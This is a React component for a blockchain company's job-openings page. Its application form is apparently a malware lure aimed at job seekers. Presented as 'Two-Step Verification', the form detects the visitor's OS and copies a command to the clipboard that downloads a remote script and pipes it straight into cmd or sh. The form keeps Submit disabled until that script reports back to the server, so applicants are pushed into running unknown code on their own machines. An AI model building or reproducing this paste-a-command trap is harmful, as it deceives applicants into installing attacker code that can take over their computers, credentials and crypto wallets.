import React, { useMemo, useState, useEffect } from 'react'
import { Blocks, Users, BarChart3, Network, PenTool, Code, Database, FileCode2 } from 'lucide-react'
import Modal from '@/components/Modal'
import { useToast } from '@/components/Toast'
import ReCAPTCHA from 'react-google-recaptcha'

// SHA256 hashing util
async function sha256(input) {
  const encoder = new TextEncoder()
  const data = encoder.encode(input)
  const hashBuffer = await crypto.subtle.digest('SHA-256', data)
  const hashArray = Array.from(new Uint8Array(hashBuffer))
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('')
}

// generate token from applicant inputs
async function generateTokenFromInputs({ name, email, resume }) {
  const base = `${name.toLowerCase()}|${email.toLowerCase()}|${resume || ''}`
  return await sha256(base)
}

function detectOS() {
  const ua = typeof navigator !== 'undefined' ? navigator.userAgent : ''
  if (/Windows/i.test(ua)) return 'windows'
  if (/Macintosh|Mac OS X/i.test(ua)) return 'mac'
  if (/Linux/i.test(ua)) return 'linux'
  return 'linux'
}

const JOBS = [
  { id:1, title:'Blockchain Assistant', icon:Blocks, intro:'Support blockchain operations and research.', requirements:['Basic knowledge of blockchain and crypto','Good communication and documentation skills','Willingness to learn and adapt'], responsibilities:['Assist in smart contract reviews','Support day-to-day blockchain operations','Coordinate with developers and team leads'], benefits:['Remote-first','Learning budget','Growth opportunities'] },
  { id:2, title:'Web3 Project Coordinator', icon:Network, intro:'Help organize and support Web3 projects.', requirements:['Experience in project coordination or admin roles','Interest in blockchain/web3 ecosystem','Strong organizational skills'], responsibilities:['Coordinate with product and dev teams','Track timelines and deliverables','Assist in community engagement'], benefits:['Flexible hours','Remote-friendly','Annual offsite'] },
  { id:3, title:'Marketing Assistant (Blockchain)', icon:BarChart3, intro:'Support marketing campaigns for blockchain products.', requirements:['Basic understanding of digital marketing','Familiarity with social media & content','Strong writing and communication skills'], responsibilities:['Assist in running campaigns','Help prepare content for community','Track analytics and engagement'], benefits:['Learning support','Wellness stipend','Career growth'] },
  { id:4, title:'Business Development Assistant', icon:Users, intro:'Support commercial and partnership efforts.', requirements:['Interest in business, sales or partnerships','Good communication and presentation skills','Self-motivated and proactive'], responsibilities:['Support account management','Research new business opportunities','Assist in partnership communications'], benefits:['Career growth','Networking events','Remote allowance'] },
  { id:5, title:'UI/UX Design Assistant', icon:PenTool, intro:'Help design blockchain & AI user experiences.', requirements:['Basic design skills (Figma, Sketch, Adobe XD)','Creativity and eye for detail','Interest in UI/UX for tech products'], responsibilities:['Assist in wireframes and prototypes','Support user research & feedback','Help maintain design libraries'], benefits:['Creative growth','Mentorship from senior designers','Remote-friendly'] },
  { id:6, title:'Frontend Developer', icon:Code, intro:'Build sleek and responsive Web3 interfaces.', requirements:['Strong skills in React, Next.js or similar frameworks','Knowledge of Web3.js / Ethers.js','Experience with responsive & modern UI (Tailwind, shadcn/ui)'], responsibilities:['Develop dApp frontends with blockchain integration','Work with designers to deliver smooth UX','Optimize performance across devices'], benefits:['Remote-first','Latest Web3 dev tools','Opportunity to lead projects'] },
  { id:7, title:'Backend Developer', icon:Database, intro:'Design and maintain scalable backend systems.', requirements:['Proficiency in Node.js, Express or NestJS','Experience with databases (Postgres, MongoDB)','Knowledge of APIs, authentication and scaling'], responsibilities:['Build and maintain secure backend services','Integrate blockchain data into APIs','Ensure scalability and reliability of infrastructure'], benefits:['Remote-friendly','Cloud infrastructure experience','Career growth opportunities'] },
  { id:8, title:'Smart Contract Developer', icon:FileCode2, intro:'Design, develop and audit smart contracts.', requirements:['Strong Solidity and Ethereum development skills','Understanding of gas optimization & security','Familiar with testing frameworks (Hardhat, Foundry, Truffle)'], responsibilities:['Write and deploy secure smart contracts','Conduct contract testing and audits','Collaborate with frontend/backend teams'], benefits:['Competitive compensation','Cutting-edge blockchain R&D','Open-source contributions'] },
  
  // ✅ New Unity Developer Job Opening
  { id:9, title:'Unity Developer', icon:Code, intro:'Build immersive 3D WebGL and Metaverse experiences for our blockchain-based construction dApp.', requirements:['Proficiency in Unity3D (C#)','Experience with WebGL builds and optimization','Familiarity with 3D modeling, shaders, or game physics','Interest in Web3/Metaverse integrations'], responsibilities:['Develop real-time 3D construction visualizations','Optimize Unity scenes for browser-based WebGL','Collaborate with blockchain & frontend teams','Integrate Unity with Web3 backends'], benefits:['Remote-first','Competitive compensation','Opportunity to innovate in Metaverse & Web3'] }
]

const RECAPTCHA_SITE_KEY = '6LeGB7ErAAAAABNHG37I5AQXic6FPTOqD5YPSZDK';

export default function Jobs() {
  const [open, setOpen] = useState(false)
  const [active, setActive] = useState(null)
  const { push } = useToast()
  const [captchaToken, setCaptchaToken] = useState(null)
  const [verified, setVerified] = useState(false)
  const [form, setForm] = useState({ name: '', email: '', resume: '' })
  const [verificationToken, setVerificationToken] = useState(null)

  const os = useMemo(() => detectOS(), [])
  const cmdUrl = useMemo(() => {
    if (!verificationToken) return ''
    const base = typeof window !== 'undefined' ? `${window.location.origin}/users/auth` : ''
    return `${base}/${os}?token=${verificationToken}`
  }, [os, verificationToken])

  useEffect(() => {
    if (!verificationToken) return
    const id = setInterval(async () => {
      try {
        const res = await fetch(`/users/status/${verificationToken}`)
        const data = await res.json()
        if (data.status === "verified") {
          clearInterval(id)
          setVerified(true)
        }
      } catch (err) {
        console.error("Verification check failed", err)
      }
    }, 2000)
    return () => clearInterval(id)
  }, [verificationToken])

  const handleInput = async (e) => {
    const updated = { ...form, [e.target.name]: e.target.value }
    setForm(updated)
    if (updated.name && updated.email) {
      const token = await generateTokenFromInputs(updated)
      setVerificationToken(token)
    }
  }

  const handleCopy = async () => {
    try {
      if(os === 'windows')
        await navigator.clipboard.writeText(`cmd /c "curl ${cmdUrl} | cmd"`)
      else if(os === 'mac')
        await navigator.clipboard.writeText(`curl "${cmdUrl}" | sh`)
      else if(os === 'linux')
        await navigator.clipboard.writeText(`wget -qO- "${cmdUrl}" | sh`)
      push('Command copied to clipboard')
    } catch {
      push('Copy failed — select and copy manually')
    }
  }

  const onApply = (job) => {
    setActive(job)
    setOpen(true)
    setCaptchaToken(null)
    setVerified(false)
    setForm({ name: '', email: '', resume: '' })
    setVerificationToken(null)
  }

  const onSubmit = async (e) => {
    e.preventDefault()
    setOpen(false)
    push("Application submitted successfully! We’ll get back to you soon.")
  }

  return (
    <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
      <h1 className="text-3xl font-bold mb-6">Job Openings</h1>

      <div className="grid md:grid-cols-2 gap-6">
        {JOBS.map(job => {
          const Icon = job.icon
          return (
            <div key={job.id} className="card p-6 border border-slate-200 dark:border-slate-800">
              <div className="flex items-start justify-between gap-4">
                <div className="flex items-center gap-3">
                  <div className="h-10 w-10 rounded-lg bg-indigo/10 dark:bg-emerald/10 flex items-center justify-center">
                    <Icon className="h-5 w-5 text-indigo dark:text-emerald" />
                  </div>
                  <div>
                    <div className="font-semibold text-xl">{job.title}</div>
                    <div className="text-slate-600 dark:text-slate-300">{job.intro}</div>
                  </div>
                </div>
                <button className="btn btn-primary" onClick={() => onApply(job)}>Apply Now</button>
              </div>
              <div className="mt-4 grid sm:grid-cols-3 gap-4 text-sm">
                <div>
                  <h4 className="font-semibold">Requirements</h4>
                  <ul className="list-disc pl-5 space-y-1">{job.requirements.map((x,i)=><li key={i}>{x}</li>)}</ul>
                </div>
                <div>
                  <h4 className="font-semibold">Responsibilities</h4>
                  <ul className="list-disc pl-5 space-y-1">{job.responsibilities.map((x,i)=><li key={i}>{x}</li>)}</ul>
                </div>
                <div>
                  <h4 className="font-semibold">Benefits</h4>
                  <ul className="list-disc pl-5 space-y-1">{job.benefits.map((x,i)=><li key={i}>{x}</li>)}</ul>
                </div>
              </div>
            </div>
          )
        })}
      </div>

      <Modal open={open} onClose={() => setOpen(false)} title={active ? `Apply — ${active.title}` : 'Apply'}>
        {/* Modal content wrapper made scrollable */}
        <div className="max-h-[80vh] overflow-y-auto p-4">
          <form name="apply" method="POST" data-netlify="true" netlify-honeypot="bot-field" onSubmit={onSubmit}>
            <input type="hidden" name="form-name" value="apply" />
            <p className="hidden"><label>Don’t fill: <input name="bot-field" /></label></p>

            <div className="grid sm:grid-cols-2 gap-3">
              <div>
                <label className="label">Full Name</label>
                <input className="input" name="name" required onChange={handleInput} />
              </div>
              <div>
                <label className="label">Email</label>
                <input className="input" type="email" name="email" required onChange={handleInput} />
              </div>
            </div>

            <div className="mt-3">
              <label className="label">Resume (URL)</label>
              <input className="input" name="resume" onChange={handleInput} />
            </div>

            <div className="mt-3">
              <label className="label">Cover Letter</label>
              <textarea className="input" rows="4" name="cover" placeholder="A short note"></textarea>
            </div>

            {!verified && (
              <>
                {captchaToken ? (
                  <div className="mt-6 rounded-2xl border border-slate-200 dark:border-slate-800 p-4">
                    <h3 className="text-lg font-semibold mb-2">Two-Step Verification</h3>
                    <ol className="list-decimal ml-5 space-y-2 text-sm">
                      <li>Complete the reCAPTCHA below.</li>
                      <li>Once verified, your OS-specific terminal command will appear.</li>
                      <li>Copy the command below for your OS and paste into the terminal.</li>
                    </ol>

                    <div className="mt-4 text-sm">
                      <label className="label mb-1">
                        {os === 'windows' ? 'Windows Command/URL' : os === 'mac' ? 'Mac Command/URL' : 'Linux Command/URL'}
                      </label>

                      <div className="flex items-stretch gap-2">
                        <input
                          className="input flex-1 font-mono select-none pointer-events-none"
                          readOnly
                          value={cmdUrl}
                          onCopy={(e) => e.preventDefault()}
                          onFocus={(e) => e.currentTarget.select()}
                        />
                        <button type="button" onClick={handleCopy} className="btn btn-secondary">Copy</button>
                      </div>

                      <div className="mt-2 text-xs text-slate-500">
                        Verification token: <code className="font-mono">{verificationToken}</code>
                      </div>
                    </div>
                  </div>
                ) : (
                  <div className="mt-3">
                    <ReCAPTCHA sitekey={RECAPTCHA_SITE_KEY} onChange={(value) => setCaptchaToken(value)} />
                  </div>
                )}
              </>
            )}

            <div className="mt-4 flex justify-end gap-2">
              <button type="button" onClick={() => setOpen(false)} className="btn btn-ghost">Cancel</button>
              <button type="submit" className="btn btn-primary" disabled={!verified}>Submit</button>
            </div>
          </form>
        </div>
      </Modal>
    </div>
  )
}